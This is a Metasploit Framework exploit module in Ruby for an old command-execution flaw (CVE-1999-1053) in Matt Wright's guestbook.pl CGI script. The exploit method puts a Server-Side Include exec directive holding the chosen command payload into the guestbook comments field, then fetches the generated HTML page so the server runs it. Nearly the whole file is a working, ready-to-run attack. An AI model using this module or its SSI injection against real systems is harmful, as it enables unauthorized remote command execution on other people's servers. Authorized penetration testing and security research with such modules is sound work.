##
# $Id: guestbook_ssi_exec.rb 9671 2010-07-03 06:21:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Matt Wright guestbook.pl Arbitrary Command Execution',
			'Description'    => %q{
				The Matt Wright guestbook.pl <= v2.3.1 CGI script contains
				a flaw that may allow arbitrary command execution. The vulnerability
				requires that HTML posting is enabled in the guestbook.pl script, and
				that the web server must have the Server-Side Include (SSI) script
				handler enabled for the '.html' file type. By combining the script
				weakness with non-default server configuration, it is possible to exploit
				this vulnerability successfully.
			},
			'Author'         => [ 'patrick' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9671 $',
			'References'     =>
				[
					[ 'CVE', '1999-1053' ],
					[ 'OSVDB', '84' ],
					[ 'BID', '776' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 1024,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Platform'       => [ 'unix', 'win', 'linux' ],
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Nov 05 1999',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('URI', [true, "guestbook.pl script path", "/cgi-bin/guestbook.pl"]),
					OptString.new('URIOUT', [true, "guestbook.html output", "/guestbook/guestbook.html"]),
				], self.class)
	end

	def exploit
		realname	= rand_text_alphanumeric(20)
		email		= rand_text_alphanumeric(20)
		city		= rand_text_alphanumeric(20)
		state		= rand_text_alphanumeric(20)
		country 	= rand_text_alphanumeric(20)

		sploit = Rex::Text.uri_encode("<!--#exec cmd=\"" + payload.encoded.gsub('"','\"') + "\"", 'hex-normal')

		req1 = send_request_cgi({
			'uri'     => datastore['URI'],
			'method'  => 'POST',
			'data'    => "realname=#{realname}&username=#{email}&city=#{city}&state=#{state}&country=#{country}&comments=#{sploit}",
		}, 25)

		req2 = send_request_raw({
			'uri'     => datastore['URIOUT'],
		}, 25)

	end
end
